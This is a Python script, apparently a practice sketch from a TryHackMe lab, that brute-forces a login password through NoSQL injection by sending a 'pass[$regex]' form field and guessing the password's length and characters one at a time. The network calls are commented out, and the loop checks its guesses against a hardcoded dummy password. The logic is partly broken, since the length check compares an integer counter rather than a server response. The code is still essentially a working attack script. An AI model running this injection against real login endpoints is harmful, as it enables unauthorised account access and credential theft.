"""Bruteforce a password via NoSQL-Injection. Rough sketch based on the tryhackme tutorial server."""

import argparse
import re
import requests
import string

IP = "127.0.0.1"
PORT = "4444"
TARGET = "inject_me"
MAX_LENGTH = 8
PASSWORD = "bc34" #dummy


CHARSET =  string.digits + string.ascii_letters

def send_payload(ip, port, target, username, regex) -> str:
    url = f"http://{ip}:{port}/{target}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
        "Origin": f"http://{ip}",
        "Referer": f"http://{ip}/?err=1"
    }
    data = {
        "user": username,
        "pass[$regex]": regex,
        "remember": "on"
    }
    response = requests.post(url, headers=headers, data=data)
    return response.headers.get("Location", "")

def get_length(username) ->int:
    length = 1
    length_found = False
    regex = f"^.{length}$"
    while not length_found and length <= max_len:
        regex = f"^.{length}$"
        try:
            #location = send_payload(IP, PORT, TARGET, username, regex)
            location = length
            print(f"Length: try: {regex}")
        except Exception as e:
            print(e)
        if location == len(PASSWORD): # expected server location response, e.g "/gotit.php"
            length_found = True
            print(f"PASSWORD-LENGTH FOUND: {length}")
            return length
        else:
            length += 1
    print(length)
    if length > max_len:
        raise ValueError("Max length exceeded")


def brute_force(length) -> str:
    chars = f""
    for i in range(length):
        for char in CHARSET:
            regex = f"^{chars + char}{'.' * (length-len(chars)-1)}$"
            try:
                #location = send_payload(IP, PORT, TARGET, username, regex)
                location = re.compile(regex)
                print(f"REGEX try: {regex}")
            except Exception as e:
                print(e)
            if location.match(PASSWORD): #correct check would be if location == "/gotit.php":
                chars += char
                print(f"FOUND: {chars}")
                break
    return(chars)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", default=IP)
    parser.add_argument("-p", "--port", default=PORT)
    parser.add_argument("-t", "--target", default=TARGET)
    parser.add_argument("-u", "--username", default="user")
    parser.add_argument("-m", "--max_len", default=MAX_LENGTH)
    args = parser.parse_args()
    user = args.username
    ip = args.ip
    port = args.port
    target = args.target
    max_len = args.max_len
    length = get_length("user")
    password = brute_force(length)
    print(password)
